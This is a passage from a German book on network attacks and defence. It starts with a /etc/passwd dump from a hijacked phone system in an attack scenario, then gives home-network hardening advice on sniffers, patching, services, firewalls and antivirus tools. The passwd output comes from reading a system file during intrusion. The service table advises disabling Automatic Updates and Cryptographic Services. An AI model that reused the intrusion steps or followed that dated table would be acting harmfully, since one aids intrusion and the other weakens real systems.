nobody:x:99:99:Nobody:/:/bin/false httpd:x:48:102:Apache:/var/www:/bin/false softwinst:x:0:1001: softwinst-account:/DHS3bin/soft_install/bin:/bin/bash admin:x:2011:1002:admin:/DHS3bin/mtcl:/bin/bash developer:x:2013:1002:developer:/DEVbin/developer:/bin/bash adflex:x:2015:1003:adflex:/DHS3bin/adflex:/bin/bash (1)xa000000>\nDie TK-Anlage mitsamt ACD256 hat soeben virtuell den Besitzer gewechselt und er\u00f6ffnet uns zahlreiche M\u00f6glichkeiten, vom Umleiten der Gespr\u00e4che bis zum v\u00f6lligen Stillstand der PBX. An dieser Stelle kann nur erneut auf die Bedeutung der Wahl komplexer, nicht im W\u00f6rterbuch anzutreffender Kennw\u00f6rter verwiesen werden. Sp\u00e4testens dieses Szenario beweist eindrucksvoll, dass vieles von der St\u00e4rke des verwendeten Kennworts abh\u00e4ngt: Wer sich hierbei fundamentale Fehler erlaubt, hat sp\u00e4ter das Nachsehen.\n256\nhttp://en.wikipedia.org/wiki/Automatic_call_distributor\n530\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n18.12 Schutz vor Scannern, Exploits, Sniffern & Co. Schon die V\u00e4ter des Grundgesetzes der Bundesrepublik Deutschland haben erkannt, dass Eigentum verpflichtet \u2013 nicht nur in der realen, sondern auch in der virtuellen Welt. Jeder ungesicherte Rechner stellt eine Gefahr dar, die in erster Linie den Betreiber selbst und anschlie\u00dfend vielleicht auch Unbeteiligte bedroht. Es ist von enormer Bedeutung sicherzustellen, dass ein Rechner am Netz entweder ordentlich eingerichtet und gewartet werden kann oder aber gar nicht erst in Betrieb genommen wird. Deshalb auch unser erster Tipp, der im Grunde nichts anderes ist als eine Variation des stets gleichen Themas: Alle Rechner und aktiven Netzwerkkomponenten sollten in regelm\u00e4\u00dfigen Abst\u00e4nden, am besten (halb-)automatisiert, mit den jeweils neuesten Hotfixes, Patches und Updates der Hersteller versorgt werden. Ein Gro\u00dfteil der hier beschriebenen Angriffe w\u00e4re allein dadurch wirkungsvoll verhindert worden. Zus\u00e4tzlich kommt der Wahl sinnvoller Kennw\u00f6rter, der Deaktivierung unsicherer oder unbenutzter Dienste und der regelm\u00e4\u00dfigen Kontrolle von Logfiles eine fundamentale Rolle zu. Eine ma\u00dfgebliche L\u00fccke, die den Angreifer zum Erfolg gef\u00fchrt hat, wird durch die soeben empfohlenen Schutzma\u00dfnahmen allerdings nicht geschlossen, sondern durch neue Kommunikationstechnologien wie VoIP weiter aufgerissen \u2013 dem Herausfischen von Daten aus unverschl\u00fcsseltem Netzwerk-Traffic. Schon das Vorhandensein eines unautorisierten Sniffers auf einem Firmenrechner darf als Indiz gewertet werden, dass Teile des Firmennetzes kompromittiert, vertrauliche Daten abgegriffen und in fremde H\u00e4nde gelangt sind. So gesehen geh\u00f6ren Sniffer auch weiterhin zu den gr\u00f6\u00dften Netzwerksicherheitsrisiken \u00fcberhaupt. Fungiert der gesniffte PC gar als Gateway zur Au\u00dfenwelt, dann k\u00f6nnte der Schaden gr\u00f6\u00dfer nicht sein, da in diesem Fall externe Authentifizierungsdaten abgefangen und missbraucht werden k\u00f6nnen. Gegen Sniffer helfen im Prinzip nur folgende Strategien: \u2022\nEinsatz von Switching-Technologien: Es bietet sich auch aus Gr\u00fcnden der Performance an, auf Switching-Technologie zu setzen, zudem entzieht ein geswitchtes Netzwerk Sniffern den N\u00e4hrboden. Werden die Logfiles der Switches dann noch regelm\u00e4\u00dfig auf Spoofing-Vorf\u00e4lle ausgewertet oder greifen Anti-Spoofing-Ma\u00dfnahmen, sollten Vorf\u00e4lle wie die eingangs dargestellten schnell zu entdecken sein.\n\u2022\nUnautorisierte Sniffer entdecken und aus dem Verkehr ziehen: Da Sniffer passiv arbeiten, sind sie kaum zu entdecken. In heterogenen Netzwerken mit Hunderten von Rechnern gleicht die Suche nach einem aktiven Sniffer der Suche nach einer Nadel im Heuhaufen. F\u00fcr die Suche gibt es jedoch einen handfesten Anhaltspunkt: Sniffer bedienen sich einer Netzwerkkarte, die in den Promiscuous Mode geschaltet ist. Also muss man bevorzugt nach Rechnern suchen, deren Netzwerkkarte auf diesen Modus umgeschaltet wurde. Vereinzelt werden Tools angeboten, mit denen man lokal \u00fcberpr\u00fcfen kann, ob die Netzwerkkarte im Promiscuous Mode l\u00e4uft oder nicht. Bei etlichen hundert Rechnern ist dieses Verfahren sinnlos. Hier kann man zu einem Trick greifen. Da etliche Sniffer IP-Adressen aus praktischen Gr\u00fcnden via Reverse DNS-Lookup gleich zu Hostnamen aufl\u00f6sen, erzeugen sie mehr DNS-Traffic. Schickt man jetzt Datenpakete\n18.12 Schutz vor Scannern, Exploits, Sniffern & Co.\n531\nan einen nicht existenten Host, tauchen pl\u00f6tzlich vermehrt Reverse DNS-Lookups auf \u2013 ein Indiz daf\u00fcr, dass ein Netzwerkrechner Daten belauscht, die nicht f\u00fcr ihn bestimmt sind. Noch einfacher w\u00e4re es freilich, nur solche Netzwerkkarten anzuschaffen, die sich hardwareseitig nicht in den Promiscuous Mode schalten lassen, doch selbst dann kann nicht ausgeschlossen werden, dass fremde Rechner unerkannt in das Netzwerk gelangen. \u2022\nDatenverkehr verschl\u00fcsseln: Die umfassendste und zugleich effektivste M\u00f6glichkeit, Sniffern wirkungsvoll den Boden zu entziehen, ist das Verschl\u00fcsseln s\u00e4mtlicher Datenpakete, beispielsweise durch sichere Protokolle wie SSHv2, HTTPS, IMAPS und FTPS oder den Einsatz von VPN-Technologie. Zudem gibt es die klassischen Methoden, um E-Mails und andere Dokumente mit symmetrischer oder asymmetrischer Verschl\u00fcsselung vor neugierigen Blicken zu sch\u00fctzen, zum Beispiel GnuPG/PGP, AxCrypt oder TrueCrypt-Container.\nMit einem nicht unerheblichen Risiko sehen sich Unternehmen konfrontiert, die aus Kosten- oder Handlinggr\u00fcnden \u2013 tiefsch\u00fcrfende \u00dcberlegungen au\u00dfer Acht lassend \u2013 auf IP-Telefonie umsteigen: Die als zuverl\u00e4ssig geltende klassische Telefonie erbt in diesem Fall n\u00e4mlich zahlreiche Unzul\u00e4nglichkeiten der IT-Branche. Nicht nur, dass neue Spam-Technologien das Netz lahmlegen k\u00f6nnen, es brechen auch f\u00fcr Datenspione goldene Zeiten an. Nie war es f\u00fcr Unberechtigte einfacher, Telefongespr\u00e4che abzuh\u00f6ren und zu speichern. Zwar gibt es im privaten Umfeld VoIP-Systeme wie Skype, die mit AES den kompletten Telefonverkehr verschl\u00fcsseln (solange die Teilnehmer nicht ins \u00f6ffentliche Telefonnetz wechseln und kein Misstrauen hinsichtlich des amerikanischen Betreibers der Skype-Plattform besteht), aber in Firmen werden andere Systeme eingesetzt, die zum gro\u00dfen Teil ohne Verschl\u00fcsselung auskommen m\u00fcssen bzw. die geforderte Sprachqualit\u00e4t mit den vorhandenen Mechanismen nicht erreichen k\u00f6nnen. Es gibt allerdings Ans\u00e4tze, dieses Problem zu l\u00f6sen, sowohl seitens der Hardwareanbieter als auch seitens arrivierter Datensch\u00fctzer wie Phil Zimmermann, der im M\u00e4rz 2009 die aktualisierte Beta-Version von Zfone257 vorstellte. Wer wirksame Verschl\u00fcsselungsl\u00f6sungen f\u00fcr die klassische Telefonie, etwa in Gestalt eines Mobiltelefons, sucht, sollte einen Blick auf das CryptoPhone258 der Firma GSMK CryptoPhone werfen.\n257\nhttp://zfoneproject.com\n258\nhttp://www.cryptophone.de\n533\nTeil III: Pr\u00e4vention und Prophylaxe Nachdem wir in den vorangegangenen Kapiteln etliche b\u00f6sartige Threads und Angriffstechniken im Detail beschrieben haben, wollen wir uns nicht nachsagen lassen, mit unserem Buch nur den Nachwuchshackern eine Steilvorlage zu liefern. Wir glauben, dass man sich nur dann ausreichend sch\u00fctzen kann, wenn man die Netzwerkattacken nicht nur theoretisch, sondern auch praktisch nachverfolgen kann. Deshalb ist dieses Buch entstanden. Und nat\u00fcrlich finden Sie auch viele praktische Tipps in den einzelnen Kapiteln, wie man diese Angriffe abfangen bzw. ins Leere laufen lassen kann. Zu einem proaktiven Sicherheitsmanagement geh\u00f6rt aber ein systematischer Ansatz. Da sich die Situation f\u00fcr private Netzwerkanwender anders darstellt als f\u00fcr Netzwerk-Administratoren kleinerer und mittlerer Firmennetze, haben wir dieses letzte Kapitel auch entsprechend unterteilt.\n535\n19 Private Networking Der private Netzwerkanwender administriert in der Regel einige wenige PCs (und vielleicht ein paar Notebooks), die jeweils \u00fcber einen WLAN-Router mit integriertem DSLModem miteinander kommunizieren. Nicht immer hat jedes Familienmitglied seinen eigenen PC; manchmal teilen sich zwei oder mehr Personen auch einen PC mit Internetanschluss. Nutzungs-/Surfverhalten sowie Betriebssystem- und Netzwerkkenntnisse sind h\u00e4ufig heterogen, um es mal milde auszudr\u00fccken. F\u00fcr viele muss der PC samt Internetzugang einfach nur funktionieren; die Auslieferungskonfiguration mit Voreinstellung f\u00fcr AV-Software, Firewall und WLAN-Komponenten werden meistens unbesehen \u00fcbernommen. Bei der anderen Variante hat ein guter Bekannter oder Freund das Netzwerk zum Laufen gebracht. Wie auch immer. Die folgenden Ausf\u00fchrungen k\u00f6nnen Sie als eine Art Fahrplan betrachten, wie Sie Ihr Netzwerk und die darin integrierten PCs gegen\u00fcber den meisten b\u00f6sartigen Angriffen grunds\u00e4tzlich absichern k\u00f6nnen.\n19.1\nSicherheitsstatus mit MBSA \u00fcberpr\u00fcfen\nZwar empfiehlt Microsoft seinen Baseline Security Analyzer (MBSA) 2259 speziell f\u00fcr kleine und mittlere Unternehmen, um Sicherheitsprobleme prophylaktisch zu beheben. Er l\u00e4sst sich aber aus unserer Sicht auch f\u00fcrs private Netzwerk sehr gut nutzen. Weltweit werden nach Aussagen von Microsoft mit diesem Tool mehr als drei Millionen PCs auf fehlende Sicherheitsupdates und Patches gescannt \u2013 was nicht wundert, da die vielen Netzwerkattacken auf noch unbekannte bzw. ungepatchte Sicherheitsl\u00fccken abzielen. Diese L\u00fccken m\u00f6glichst fr\u00fchzeitig zu schlie\u00dfen, sollte das Ziel eines jeden engagierten Netzwerkusers sein. Der MBSA ist schnell und problemlos installiert und l\u00e4uft unter Windows Server 2003, Windows Server 2008, Windows XP, Windows 2000 und unter Windows Vista. Um mit dem Tool arbeiten zu k\u00f6nnen, muss man als Administrator angemeldet sein. Au\u00dferdem muss der Service Automatische Updates aktiviert sein, sonst bekommt man bei der System\u00fcberpr\u00fcfung folgende Fehlermeldung:\nBild 19.1: Automatische Updates m\u00fcssen aktiviert sein\nEs ist eine Einstellungssache, ob man diesen Dienst standardm\u00e4\u00dfig aktiviert oder nicht. Das Einstellungsfenster erreicht man unter Start / Ausf\u00fchren / \u00d6ffnen / sysdm.cpl. Anschlie\u00dfend kann man im Hauptfenster Systemeigenschaften festlegen, wie man den Computer mit regelm\u00e4\u00dfigen Sicherheitsupdates versorgen m\u00f6chte.\n259\nhttp://www.microsoft.com/germany/technet/sicherheit/tools/mbsa/2_0.mspx\n536\nKapitel 19 \u2013 Private Networking\nBild 19.2: Automatische Updates einrichten\nDie einfachste M\u00f6glichkeit wird zuerst aufgef\u00fchrt: die automatische Installation. Mich (PK) hat die Funktion schon oft genervt, wenn hier Updates installiert werden sollen, die partout nicht laufen, z. B. Updates f\u00fcr eine inkompatible Version des Flash-Players. Aus dem Grund ist sie bei mir deaktiviert. F\u00fcr den MBSA muss der Dienst allerdings aktiviert sein. Auf die Schnelle erreicht man das auch unter Start / Ausf\u00fchren / \u00d6ffnen / services.msc. Aus der Liste pickt man sich jetzt den deaktivierten Service heraus, legt als Starttyp manuell an und startet den Dienst von Hand.\n19.1 Sicherheitsstatus mit MBSA \u00fcberpr\u00fcfen\n537\nBild 19.3: Manueller Start\nIm n\u00e4chsten Schritt wird festgelegt, ob man den lokalen PC untersuchen m\u00f6chte oder mehrere PCs im Netzwerk, die anhand ihrer Dom\u00e4nenzugeh\u00f6rigkeit oder eines IPBereiches ausgew\u00e4hlt werden. Der Computername wird in der Regel automatisch \u00fcbernommen, d. h., man muss keine gro\u00dfe Recherche nach IP-Adresse usw. betreiben. Die \u00dcberpr\u00fcfungsergebnisse werden dann sehr anschaulich mit einer Ampelfunktion dargestellt. Alles, was mit einem roten Kreuz markiert ist, ist extrem kritisch; der Gegenstand eines gelben Kreuzes sollte \u00fcberpr\u00fcft werden, und der gr\u00fcne Haken ist nat\u00fcrlich selbsterkl\u00e4rend. Blaue Sternchen geben mehr oder weniger brauchbare Hinweise und Informationen.\n538\nKapitel 19 \u2013 Private Networking\nBild 19.4: Auswahl des Zielsystems\nBild 19.5: Ergebnisse des MBSA-Checks\n19.1 Sicherheitsstatus mit MBSA \u00fcberpr\u00fcfen\n539\nDiese Sicherheitsl\u00f6sung ist beispielhaft. Schade, dass dieses auch f\u00fcr den Heimanwender n\u00fctzliche Produkt nicht st\u00e4rker von Microsoft promotet wird \u2013 zumal die Benutzerf\u00fchrung und interaktive Hilfestellung zum Besten geh\u00f6rt, was solche Programme bieten k\u00f6nnen. Betrachten wir jetzt unser Beispiel: Es fehlen 14 Sicherheitsupdates, zus\u00e4tzlich wird ein fehlendes Office-Sicherheitsupdate moniert. Weiterhin wird bem\u00e4ngelt, dass der Systemdienst f\u00fcr automatische Updates nicht richtig konfiguriert ist (aufgrund unseres oben beschriebenen Schnellschusses). In der Ergebnisspalte stehen fallweise drei Alternativen bereit: a) Gegenstand der \u00dcberpr\u00fcfung (allgemeine Informationen \u00fcber die Pr\u00fcfobjekte) b) Ergebnisdetails (zeigt, welche Patches und Updates genau fehlen) c) Vorgehensweise zur Behebung (mit Erl\u00e4uterungen im Detail) F\u00fcr uns interessant sind jetzt nur die Ergebnisdetails. F\u00fcr die Anzeige wird der hauseigene Internet Explorer verwendet. Bleibt das Anzeigefenster leer, muss die Anzeigeoption allow blocked content aktiviert werden. Das Ergebnisfenster sieht jetzt so aus:\nBild 19.6: Ergebnisdetails MBSA\n540\nKapitel 19 \u2013 Private Networking\nKlickt man jetzt den Download-Button an, erh\u00e4lt man erst einmal eine Sicherheitswarnung:\nBild 19.7: Sicherheitswarnung beim Download\n\u00dcberpr\u00fcft man jetzt mehrere PCs hintereinander, wird man zweckm\u00e4\u00dfigerweise die Patches auf der Platte zur m\u00f6glichen Wiederverwendung speichern, ansonsten reicht es, den Run-Button zu dr\u00fccken, um den Updateprozess gleich anzusto\u00dfen. Hat der User die automatische Updatefunktion deaktiviert und den MBSA lange nicht mehr laufen lassen, gibt es ein Problem: Da sich die Updates nicht parallel installieren lassen, vergeht im Allgemeinen ziemlich viel Zeit, bis man alle wichtigen und sehr wichtigen Patches installiert hat. Nachdem alle Patches und Updates installiert sind, wird es spannend: Funktioniert das System noch nach dem Neustart? Es ist eine rhetorische Frage, da sich die Updates normalerweise problemlos einrichten lassen. Man sollte allerdings dem Warmstart den Kaltstart vorziehen, sonst kann das System mit dem ber\u00fcchtigten Blue-Screen reagieren. Sollten die Probleme mit einem unter Umst\u00e4nden inkompatiblen Update bestehen bleiben, kann man die eingespielten Patches, Hotfixes etc. schrittweise deinstallieren.\nBild 19.8: Deinstallieren von Updates\n19.2 \u00dcberfl\u00fcssige Dienste\n541\nIm Windows-Verzeichnis sind die relevanten Updates mit $NtUninstall gekennzeichnet und k\u00f6nnen dann mit spuninst.exe deinstalliert werden. Au\u00dfer auf fehlende Updates und Patches macht Microsofts Baseline Security Analyzer auch auf m\u00f6gliche Fehlkonfigurationen aufmerksam, beispielsweise darauf, dass es mehr als ein AdminKonto auf dem System gibt oder dass unter Umst\u00e4nden \u00fcberfl\u00fcssige Dienste installiert sind.\nBild 19.9: Warnung vor \u00fcberfl\u00fcssigen Diensten\n19.2\n\u00dcberfl\u00fcssige Dienste\nKein Diagnosetool der Welt kann beurteilen, ob im Einzelfall ein Dienst \u00fcberfl\u00fcssig ist oder nicht. Aber man erh\u00e4lt einen Hinweis, den man auf Relevanz pr\u00fcfen sollte. Manche Sicherheitsexperten sind in der Vergangenheit ja so weit gegangen und haben behauptet, dass das Abstellen nicht ben\u00f6tigter Dienste mindestens ein Einzelplatzsystem sicherer macht als eine Personal Firewall. Auch wenn wir hier nicht grunds\u00e4tzlich zustimmen, so ist doch ein grundlegender Punkt angesprochen. Hier gilt die Grundregel der Netzwerksicherheit, niemals einen Dienst im System zu betreiben, der nicht unbedingt erforderlich ist. Dienste oder Services sind Programme, die automatisch beim Betriebssystemstart aktiviert werden, ohne dass ein Benutzer dazu seine Zustimmung erteilt hat. Standardm\u00e4\u00dfig sind meist mehr Dienste bei einer Windows-Neuinstallation aktiviert, als ein Heimanwender tats\u00e4chlich braucht. Deshalb ist es wichtig, die eigenen Rechnersysteme so zu konfigurieren, dass nicht ben\u00f6tigte Dienste keine Sicherheitsl\u00fccke mehr aufrei\u00dfen. Bei der Beurteilung, welche Dienste deaktiviert werden k\u00f6nnen und welche f\u00fcr den Systembetrieb notwendig sind, tun sich Laien aber recht schwer. Die Dienste-\u00dcbersicht wird aufgerufen mit Start / Ausf\u00fchren / services.msc. Anschlie\u00dfend sieht man mehrere Dutzend Dienste, sortierbar nach Name, Autostarttyp (automatisch, deaktiviert, manuell) oder Status (gestartet).\n542\nKapitel 19 \u2013 Private Networking\nBei einem Einzelplatzsystem kann man sich grob an folgende Empfehlungen halten: Dienste\nStatus\nAblagemappe\nDeaktivieren\nAnmelde-Dienst\nDeaktivieren\nAutomatische Updates\nDeaktivieren\nCOM+-Ereignissystem, COM+-Systemanwendung\nManuell\nEingabeger\u00e4tezugang\nDeaktivieren\nFehlerberichterstattungs-Dienst\nDeaktivieren\nHilfe und Support\nDeaktivieren\nIMAPI-CD-Brenn-COM-Dienste\nDeaktivieren\nIndexdienst\nDeaktivieren\nKompatibilit\u00e4t f\u00fcr schnelle Benutzerumschaltung\nDeaktivieren\nKryptografie-Dienste\nManuell\nNetMeeting-Remotedesktop-Freigabe\nDeaktivieren\nNT-LM-Sicherheitsdienst\nDeaktivieren\nRouting und RAS\nDeaktivieren\nServer\nDeaktivieren\nShellhardware-Erkennung\nDeaktivieren (DVDs werden nicht mehr automatisch geladen!)\nSmartcard\nDeaktivieren\nSmartcard-Hilfsprogramm\nDeaktivieren\nSSDP-Suchdienst\nDeaktivieren\nTelefonie\nAutomatisch\nTelnet\nDeaktivieren\nTerminaldienste\nDeaktivieren\nUniverseller Plug & Play-Ger\u00e4tehost\nDeaktivieren\nWebclient\nDeaktivieren\nWindows-Zeitgeber\nDeaktivieren\nWas die Dienste leisten, wof\u00fcr sie im Detail zust\u00e4ndig sind und wer von welchem abh\u00e4ngt \u2013 all das kann man auch im Netz nachlesen, z. B. auf der Website von Firma Microsoft260.\n260\nhttp://technet.microsoft.com/de-de/library/dd443754.aspx\n19.3 Vor \u00bbDienstschluss\u00ab Abh\u00e4ngigkeiten \u00fcberpr\u00fcfen\n19.3\n543\nVor \u00bbDienstschluss\u00ab Abh\u00e4ngigkeiten \u00fcberpr\u00fcfen\nEine Warnung vorab m\u00fcssen wir nat\u00fcrlich loswerden. Wenn Sie einen Service deaktivieren, von dem Sie glauben, er sei \u00fcberfl\u00fcssig, k\u00f6nnten Sie recht behalten; es k\u00f6nnte aber auch passieren, dass ein Programm, das Sie etliche Tage sp\u00e4ter wieder einmal starten wollen, aus scheinbar unerfindlichen Gr\u00fcnden die weitere Zusammenarbeit mit Ihnen als User ablehnt. Im schlimmsten Fall k\u00f6nnte auch passieren, dass Ihr Windows-System nicht mehr hochf\u00e4hrt oder sich an unerwarteter Stelle verabschiedet. Kurz gesagt: Es ist gef\u00e4hrlich, an diesen Stellschrauben zu drehen, wenn man nicht vorher recherchiert hat, f\u00fcr welchen anderen Dienst bzw. f\u00fcr welche sonstigen Programmmodule dieser Service gut ist. Im Eigenschaftsfenster Abh\u00e4ngigkeiten der einzelnen Dienste bekommen Sie Hinweise, die durchaus ernst zu nehmen sind:\nBild 19.10: Abh\u00e4ngigkeitsverh\u00e4ltnisse von Diensten\nF\u00fcr jeden Dienst werden die direkten und indirekten Abh\u00e4ngigkeiten ermittelt, was auch bei der Fehlersuche ausgesprochen n\u00fctzlich sein kann. Um generell die Risiken einer Fehlkonfiguration zu minimieren, k\u00f6nnen Sie den Zweig der Registry, der f\u00fcr die Dienstekonfiguration zust\u00e4ndig ist, entweder manuell sichern, oder Sie sichern mit dem schon beschriebenen Tool ERUNT gleich die komplette Registry, um sie bei Bedarf zur\u00fcckzusichern. Wenn Sie den Registryzweig Services exportiert haben, reicht ein Doppelklick auf die Reg-Datei und der alte Zustand der Dienste ist wiederhergestellt. Es gibt nat\u00fcrlich auch Tools, die diesbez\u00fcgliche Konfigurationsunterst\u00fctzung anbieten, z. B. svc2kxp.cmd, das\n544\nKapitel 19 \u2013 Private Networking\nmittlerweile in der Version 2.2261 vorliegt und speziell auf Win XP mit Servicepack 2 und 3 abgestimmt ist.\nBild 19.11: \u00dcberfl\u00fcssige Dienste entsorgen\nWie beim Toolstart zu sehen ist, gibt es drei Optionen plus das R\u00fcckg\u00e4ngigmachen. Option 3 ist nur f\u00fcr reine Einzelplatzl\u00f6sungen ohne Netzwerkverbindung sinnvoll. Hat man ein eigenes Heimnetz mit Netzwerkdruckern und mehreren Rechnern, kommen nur noch die Optionen 1 und 2 in Betracht. Option 2 ist rigider als die Option 1, da hier der Server Message Block komplett deaktiviert wird. Mindestens mit st\u00e4rkeren Komforteinbu\u00dfen (keine Netzwerkfreigaben, kein Network Browsing) muss der Anwender hier rechnen.\n19.4\nAlle Dienste mit dem Process Explorer im Blick\nWer gerne mit Netzwerktools experimentiert, sollte sich alle Dienste genauer anschauen. Eine sehr gut strukturierte und vor allem umfassende Unterst\u00fctzung erhalten Sie dabei durch das Tool Autoruns, das Sie sich zusammen mit dem Process Explorer kostenlos unter http://technet.microsoft.com/de-de/sysinternals/default.aspx herunterladen k\u00f6nnen. Angezeigt werden hier alle aktiven Services mit einer passablen Kurzbeschreibung und der M\u00f6glichkeit, diese Services zu validieren: Anhand einer eigenen Signaturliste wird \u00fcberpr\u00fcft, ob der betreffende Dienst eine g\u00fcltige Herstellersignatur aufweist. Da einige Sch\u00e4dlinge sich nat\u00fcrlich auch als Dienst tarnen, kann man ihnen damit auf die Spur kommen. \u00dcberdies lassen sich illegale Dienste auch relativ einfach an Ort und Stelle terminieren. Sehr praktisch ist auch die interne Schnittstelle zum Process Explorer, mit dem man die Arbeitsweise der Dienste detailliert \u00fcberwachen kann.\n261\nkostenlos auf www.ntsvcfg.de\n19.4 Alle Dienste mit dem Process Explorer im Blick\n545\nBild 19.12: Umfassende Zugriffs- und Manipulationsm\u00f6glichkeiten mit Autoruns\nBild 19.13: Dienste \u00fcber die Schnittstelle zum Process Explorer \u00fcberwachen\n546\n19.5\nKapitel 19 \u2013 Private Networking\nExterner Security-Check tut Not\nWenn man jetzt die Schotten sozusagen dicht gemacht hat, kann man sich vom Erfolg seiner Bem\u00fchungen durch einen externen Security-Check vergewissern, z. B. auf http://webscan.security-check.ch. Angeboten werden ein Browser-Check und ein Quickoder Full-Scan des gesamten Systems. Beim Browser-Check wird \u00fcberpr\u00fcft, welche Skripts aktiv sind und ob gegebenenfalls Spyware im Browser-Background mitl\u00e4uft. Ergiebiger ist der Full-Scan. Nach der Anmeldung erh\u00e4lt man einen Freischaltcode, mit dem der Scan gestartet wird. Anschlie\u00dfend bekommt man die Testauswertung via EMail zugesandt. Wenn man dann Pech hat, zeigt der Security-Check unter Umst\u00e4nden immer noch offene Dienste an\nBild 19.14: Ergebnis eines Full-Scans \u00fcbers Intenet\nDie Suche nach dem \u00dcbelt\u00e4ter kann dann ziemlich aufhalten, zumal Fehlalarme nicht ausgeschlossen sind. In unserem Fall wurde z. B. keine Firewall entdeckt, obwohl ZoneAlarm Pro aktiv ist; auf der anderen Seite fanden sich die UDP-Ports 67 und 31337 offen. Da \u00fcber den letztgenannten Port auch das ber\u00fchmt-ber\u00fcchtigte Remote Administration Tool Back Orifice kommuniziert, k\u00f6nnte hier schnell Panik aufkommen. Da ist es auch nur ein schwacher Trost, wenn die sonstigen Tests eher ein beruhigendes Resultat erbringen.\nBild 19.15: Weitere Online-Checks\nWir haben unser System mehrfach gecheckt, u. a. mit Bordmitteln wie Netstat, mit dem schon vorgestellten Port Explorer und mit einem weiteren Online-Check bei http://security.symantec.com. Resultat: Offenkundiger Fehlalarm. Wie auch immer, solche Tests helfen, tiefer in die Materie einzusteigen. \u00dcber Firewalls haben wir ja schon im Zusammenhang mit Malware-Attacken aus dem Internet gesprochen. Gut konfigurierte Dienste ersetzen keine Firewall, insbesondere nicht in einem Heimnetzwerk, wo\n19.5 Externer Security-Check tut Not\n547\nmehrere PCs nicht nur untereinander, sondern auch ins Internet Kontakt aufnehmen. Man erleichtert sich den Administrationsaufwand, wenn man auf jedem Netzwerk-PC jeweils eine Lizenz desselben Produkts installiert. Und wenn wir gerade beim Checken von offenen Ports sind: Es geh\u00f6rt zur Pflicht auch eines Home-Admins, regelm\u00e4\u00dfig die Firewall-Logs sowie die aktuellen Sicherheitseinstellungen der Firewall zu \u00fcberpr\u00fcfen. Unter anderem sieht man hier, welche Programme gerade Netzwerkaktivit\u00e4ten zeigen und welche Sicherheitsoptionen gew\u00e4hlt wurden.\nBild 19.16: Unliebsame \u00dcberraschungen vermeiden: Kontrolle der Firewall\nGerade wenn sich mehrere Benutzer einen PC teilen, ist die gelegentliche Kontrolle angebracht, welche Programme f\u00fcr den Internetzugang freigegeben wurden. Es gibt gen\u00fcgend Beispiele, bei denen unachtsame Programmfreigaben (von bewussten Manipulationen ganz zu schweigen) Keyloggern und anderen Parasiten einen Systemzugang verschaffen. Wer ein ihm unbekanntes Programm sieht, dem der Netzzugriff auch serverseitig gew\u00e4hrt wurde, tut gut daran, dieses Programm n\u00e4her anzuschauen und im Zweifelsfall die Berechtigungen herunterzusetzen. Je nach Einstellung protokolliert Zonealarm eingehende und ausgehende Datenstr\u00f6me. Mit einem Tool wie Zonelog Analyzer262 k\u00f6nnen Attacken im Detail analysiert, WhoisAbfragen gestartet und Reports zu ausgew\u00e4hlten Adressen, Ports, Zeiten etc. erstellt\n262\nhttp://zonelog.co.uk, seit 2005 nicht mehr weiterentwickelt, aber nach wie vor brauchbar\n548\nKapitel 19 \u2013 Private Networking\nwerden. Man beh\u00e4lt so als Heimadministrator einen besseren \u00dcberblick, was im eigenen Netzwerk passiert.\nBild 19.17: Analyse der Netzzugriffe mit Zonelog Analyzer\n19.6\nMalware-Check\nBei der Erstauflage schrieben wir noch, dass es keine All-In-One-L\u00f6sungen g\u00e4be, die mit jedweder Art von Sch\u00e4dlingen, seien es Viren, W\u00fcrmer, Trojaner, Keylogger, RATs oder Rootkits fertig w\u00fcrden. Heute m\u00fcssen wir unser Urteil revidieren. Selbst kostenlose Malwarescanner warten heute mit einem Fast-Rundum-Schutz auf \u2013 mit Ausnahme vielleicht von Firewall-Funktionalit\u00e4ten. Bei den Security-Suiten der AV-Anbieter gibt es kaum noch eine L\u00fccke, die man f\u00fcllen m\u00fcsste. Leider steckt der Teufel dann im Detail: Kaum eine Security-Suite erf\u00fcllt auch nur ansatzweise die vollmundigen Werbeversprechen, teilweise sind die Ergebnisse sogar mangelhaft263. Eine gute \u00dcbersicht findet man hier:\n263\nVgl. hierzu einen aktuellen Test in der c't-Ausgabe 5/2010\n19.6 Malware-Check\n549\nBild 19.18: Vergleich aller g\u00e4ngiger AVProdukte\nDer Test (einsehbar unter www.av-comparatives.org) zeigt, dass manche Suiten bessere Erkennungsraten haben, andere hingegen \u00fcber ein leistungsf\u00e4higeres Fr\u00fcherkennungssystem verf\u00fcgen. Was empfehlenswert w\u00e4re, grunds\u00e4tzlich aber mehr Probleme schafft als l\u00f6st, ist der parallele Einsatz mehrerer Security-Produkte. Was noch funktioniert, ist der parallele Einsatz von On-Demand-Scannern, von denen die meisten als abgespeckte Freeware-Varianten verf\u00fcgbar sind. Dagegen ist vom parallelen Einsatz voll ausger\u00fcsteter Security-Suiten abzuraten. Besonders kritisch gestaltet sich auch der Einsatz mehrerer Hintergrundw\u00e4chter, da diese sich gegenseitig behindern und aufgrund ihres Ressourcenverbrauchs den PC merklich verlangsamen k\u00f6nnen. F\u00fcr eine gute Rundumversorgung sind zwei Strategien empfehlenswert. \u2022\nEinsatz einer kostenpflichtigen Security-Suite (G-Data, Kaspersky, Avast etc.), erg\u00e4nzt um einen oder zwei Freeware-Scanner oder\n\u2022\nEinsatz einer professionellen Desktop-Firewall (etwa Zonealarm Professional), flankiert von einem Behaviour Blocker und einem On-Demand-Scanner.\n550\nKapitel 19 \u2013 Private Networking\nAuch Microsoft hat nachgebessert und mit den Security-Essentials (f\u00fcr XP, Vista und Win 7) ein kostenloses und durchaus brauchbares Programm f\u00fcr die Grundversorgung auf den Markt gebracht. Aber auch hier kommt bei der Installation der Hinweis, vor dem Installieren die anderen im System vorhandenen Malware-Scanner zu deinstallieren. Bevor man sich also aufmacht, seine Lieblingsprodukte zur Kooperation zu bewegen beziehungsweise eine solche auszutesten, ist man gut beraten, seine Systemkonfiguration zu sichern. Mehr als brauchbar ist hier das Registry Recovery Toolkit ERUNT264, mit dem sich die Registry-Dateien t\u00e4glich sichern (eingeschr\u00e4nkt unter Win 7) und fallweise wieder restaurieren lassen. Die n\u00e4chste Frage gilt dem Einsatz spezieller Adware- und Spyware-J\u00e4ger. Zwar wird diese Funktion durch unsere AV-Scanner mit abgedeckt, erfahrungsgem\u00e4\u00df sind die Spezialtools aber leistungsf\u00e4higer. Als Erg\u00e4nzung unseres Arsenals fiel unsere Wahl hier auf Spybot-Search & Destroy265. Das Tool gl\u00e4nzt mit guten Suchleistungen, ist leidlich flott und hat auch einige Sonderfunktionen auf Lager, um noch unbekannter Spyware manuell auf den 